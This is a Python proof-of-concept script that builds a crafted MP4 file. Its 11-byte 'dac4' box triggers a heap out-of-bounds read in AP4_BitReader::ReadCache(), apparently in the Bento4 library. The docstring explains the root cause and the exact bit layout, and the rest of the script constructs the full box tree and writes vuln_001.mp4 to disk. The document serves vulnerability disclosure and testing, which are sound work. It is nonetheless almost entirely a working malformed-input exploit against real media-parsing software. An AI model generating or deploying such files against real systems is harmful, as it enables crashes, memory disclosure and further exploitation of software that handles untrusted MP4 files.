#!/usr/bin/env python3
"""
VULN-001: Heap OOB Read in AP4_BitReader::ReadCache() via crafted dac4 box.

Crafts a minimal MP4 file containing an 'ac-4' audio sample entry with a
child 'dac4' box whose payload triggers an out-of-bounds read in
AP4_BitReader::ReadCache() when parsing AC4 DSI v1 presentations.

Root cause: AP4_BitReader::ReadCache() reads 4 bytes at
  m_Buffer.GetData() + m_Position
without checking bounds.  With payload_size=11 the internal buffer is padded
to 12 bytes (3 x 4-byte words, indices 0-11).  After consuming 90 bits
(3+7+1+4+9+2+32+32) and byte-aligning, m_Position==12 and m_BitsCached==0.
The next ReadBits(8) for presentation_version calls ReadCache() at offset 12,
reading 4 bytes past the end of the heap allocation.
"""

import struct
import sys
import os

# ---------------------------------------------------------------------------
# Helper: pack a plain (non-full) box
# ---------------------------------------------------------------------------
def box(four_cc: str, payload: bytes) -> bytes:
    total = 8 + len(payload)
    return struct.pack('>I', total) + four_cc.encode('latin-1') + payload

# ---------------------------------------------------------------------------
# Helper: pack a FullBox (version 0, flags 0 unless overridden)
# ---------------------------------------------------------------------------
def full_box(four_cc: str, payload: bytes, version: int = 0, flags: int = 0) -> bytes:
    total = 12 + len(payload)
    hdr = struct.pack('>I4sBBBB',
                      total,
                      four_cc.encode('latin-1'),
                      version,
                      (flags >> 16) & 0xFF,
                      (flags >> 8) & 0xFF,
                      flags & 0xFF)
    return hdr + payload

# ---------------------------------------------------------------------------
# Craft the malicious dac4 payload (11 bytes)
#
# Bit layout (MSB-first in each byte):
#   bits  0- 2 (3b): ac4_dsi_version      = 1  → 001
#   bits  3- 9 (7b): bitstream_version    = 0  → 0000000  (<=1 → skip UUID block)
#   bit  10    (1b): fs_index             = 0  → 0
#   bits 11-14 (4b): frame_rate_index     = 0  → 0000
#   bits 15-23 (9b): n_presentations      = 1  → 000000001  (>0 → enter loop)
#   bits 24-25 (2b): bit_rate_mode        = 0  → 00
#   bits 26-57(32b): bit_rate             = 0  → 0...0
#   bits 58-89(32b): bit_rate_precision   = 0  → 0...0
#
# Total = 90 bits consumed.  Buffer padded to 12 bytes (96 bits) by BitReader.
# Byte-align step: 90%8=2 → SkipBits(6) → m_BitsCached=0, m_Position=12.
# Next ReadBits(8) for presentation_version → ReadCache() at offset 12 → OOB.
# ---------------------------------------------------------------------------
DAC4_PAYLOAD = bytes([
    0x20,  # byte 0: bits 0-7  = 001_00000  (ac4_dsi_version=1, bsv[6:0]=0)
    0x00,  # byte 1: bits 8-15 = 00_0_0000_0 (bsv[1:0]=0, fs=0, fr[3:0]=0, npres[8]=0)
    0x01,  # byte 2: bits 16-23= 00000001   (npres[7:0]=1)
    0x00,  # byte 3: bits 24-31= 00_000000  (bit_rate_mode=0, br_hi[5:0]=0)
    0x00,  # byte 4: bits 32-39
    0x00,  # byte 5: bits 40-47
    0x00,  # byte 6: bits 48-55
    0x00,  # byte 7: bits 56-63
    0x00,  # byte 8: bits 64-71
    0x00,  # byte 9: bits 72-79
    0x00,  # byte 10: bits 80-87
])
assert len(DAC4_PAYLOAD) == 11, "payload must be exactly 11 bytes"

# ---------------------------------------------------------------------------
# Build the box tree bottom-up
# ---------------------------------------------------------------------------

# --- dac4 box (plain Box, NOT a FullBox) ---
# AP4_Dac4Atom::Create reads: payload_size = size - AP4_ATOM_HEADER_SIZE (= size - 8)
# So: box_size = 8 + 11 = 19 bytes
dac4_box = box('dac4', DAC4_PAYLOAD)

# --- 'ac-4' audio sample entry ---
# ISO 14496-12 AudioSampleEntry fields (28 bytes):
#   reserved[6], data_reference_index(2), reserved[8],
#   channelcount(2), samplesize(2), pre_defined(2), reserved(2), samplerate(4)
audio_entry_fields = (
    b'\x00' * 6 +               # reserved
    struct.pack('>H', 1) +      # data_reference_index
    b'\x00' * 8 +               # reserved
    struct.pack('>H', 2) +      # channelcount
    struct.pack('>H', 16) +     # samplesize
    struct.pack('>H', 0) +      # pre_defined
    struct.pack('>H', 0) +      # reserved
    struct.pack('>I', 44100 << 16)  # samplerate (44100.0 as 16.16 fixed point)
)
# ac-4 entry = 8-byte header + 28 audio fields + dac4 child = 55 bytes
ac4_payload = audio_entry_fields + dac4_box
ac4_entry = struct.pack('>I', 8 + len(ac4_payload)) + b'ac-4' + ac4_payload

# --- stsd (FullBox) ---
stsd_payload = struct.pack('>I', 1) + ac4_entry  # entry_count=1
stsd = full_box('stsd', stsd_payload)

# --- stts (FullBox) - 0 entries ---
stts = full_box('stts', struct.pack('>I', 0))

# --- stsc (FullBox) - 0 entries ---
stsc = full_box('stsc', struct.pack('>I', 0))

# --- stsz (FullBox) - 0 samples ---
stsz = full_box('stsz', struct.pack('>II', 0, 0))  # sample_size=0, sample_count=0

# --- stco (FullBox) - 0 entries ---
stco = full_box('stco', struct.pack('>I', 0))

# --- stbl ---
stbl = box('stbl', stsd + stts + stsc + stsz + stco)

# --- smhd (FullBox): balance=0, reserved=0 ---
smhd = full_box('smhd', struct.pack('>HH', 0, 0))  # balance, reserved

# --- url  (FullBox, flags=0x000001 = self-contained) ---
url_box = full_box('url ', b'', flags=0x000001)

# --- dref (FullBox): entry_count=1, contains url box ---
dref = full_box('dref', struct.pack('>I', 1) + url_box)

# --- dinf ---
dinf = box('dinf', dref)

# --- minf ---
minf = box('minf', smhd + dinf + stbl)

# --- hdlr (FullBox) ---
# pre_defined(4) + handler_type(4) + reserved[3](12) + name(null-terminated)
hdlr_payload = (
    struct.pack('>I', 0) +      # pre_defined
    b'soun' +                   # handler_type
    b'\x00' * 12 +              # reserved
    b'Sound\x00'                # name (null-terminated)
)
hdlr = full_box('hdlr', hdlr_payload)

# --- mdhd (FullBox, version=0) ---
# creation_time(4), modification_time(4), timescale(4), duration(4),
# language(2) [packed 5-bit codes], pre_defined(2)
mdhd_payload = (
    struct.pack('>I', 0) +   # creation_time
    struct.pack('>I', 0) +   # modification_time
    struct.pack('>I', 44100) +  # timescale
    struct.pack('>I', 0) +   # duration
    struct.pack('>HH', 0x55C4, 0)  # language ('und'), pre_defined
)
mdhd = full_box('mdhd', mdhd_payload)

# --- mdia ---
mdia = box('mdia', mdhd + hdlr + minf)

# --- tkhd (FullBox, version=0, flags=0x000003 = track enabled + in movie) ---
# creation_time(4), modification_time(4), track_id(4), reserved(4),
# duration(4), reserved[2](8), layer(2), alternate_group(2),
# volume(2), reserved(2), matrix(36), width(4), height(4)
IDENTITY_MATRIX = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0,         0x40000000)
tkhd_payload = (
    struct.pack('>I', 0) +       # creation_time
    struct.pack('>I', 0) +       # modification_time
    struct.pack('>I', 1) +       # track_id
    struct.pack('>I', 0) +       # reserved
    struct.pack('>I', 0) +       # duration
    b'\x00' * 8 +                # reserved[2]
    struct.pack('>h', 0) +       # layer
    struct.pack('>h', 0) +       # alternate_group
    struct.pack('>H', 0x0100) +  # volume (1.0 for audio)
    struct.pack('>H', 0) +       # reserved
    IDENTITY_MATRIX +            # matrix (36 bytes)
    struct.pack('>I', 0) +       # width (0 for audio)
    struct.pack('>I', 0)         # height (0 for audio)
)
tkhd = full_box('tkhd', tkhd_payload, flags=0x000003)

# --- trak ---
trak = box('trak', tkhd + mdia)

# --- mvhd (FullBox, version=0) ---
# creation_time(4), modification_time(4), timescale(4), duration(4),
# rate(4), volume(2), reserved(10), matrix(36), pre_defined(24), next_track_id(4)
mvhd_payload = (
    struct.pack('>I', 0) +        # creation_time
    struct.pack('>I', 0) +        # modification_time
    struct.pack('>I', 44100) +    # timescale
    struct.pack('>I', 0) +        # duration
    struct.pack('>I', 0x00010000) + # rate (1.0)
    struct.pack('>H', 0x0100) +   # volume (1.0)
    b'\x00' * 10 +                # reserved
    IDENTITY_MATRIX +             # matrix (36 bytes)
    b'\x00' * 24 +                # pre_defined
    struct.pack('>I', 2)          # next_track_id
)
mvhd = full_box('mvhd', mvhd_payload)

# --- moov ---
moov = box('moov', mvhd + trak)

# --- ftyp ---
ftyp_payload = (
    b'mp42' +              # major_brand
    struct.pack('>I', 0) + # minor_version
    b'mp42'               # compatible_brands[0]
)
ftyp = box('ftyp', ftyp_payload)

# ---------------------------------------------------------------------------
# Assemble and write the file
# ---------------------------------------------------------------------------
mp4 = ftyp + moov

out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to: {out_path}")

# Annotate key offsets for reference
print(f"    ftyp offset : 0x{0:04x}  (size {len(ftyp)})")
print(f"    moov offset : 0x{len(ftyp):04x}  (size {len(moov)})")
print(f"    dac4 payload: {DAC4_PAYLOAD.hex()}")
